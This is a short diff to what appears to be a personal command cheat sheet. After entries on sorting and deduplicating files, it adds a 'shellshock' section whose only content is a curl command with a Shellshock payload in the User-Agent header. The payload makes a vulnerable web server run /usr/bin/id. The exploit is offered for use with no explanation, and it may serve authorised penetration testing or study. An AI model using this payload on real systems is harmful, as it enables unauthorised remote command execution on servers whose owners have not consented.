@@ -340,3 +340,8 @@ cat <file1-txt> | sort > <sorted-file1-txt>
 ```
 sort <file1-txt> | uniq > <uniq-file1-txt>
 ```
+
+## shellshock
+```
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" <url>
+```
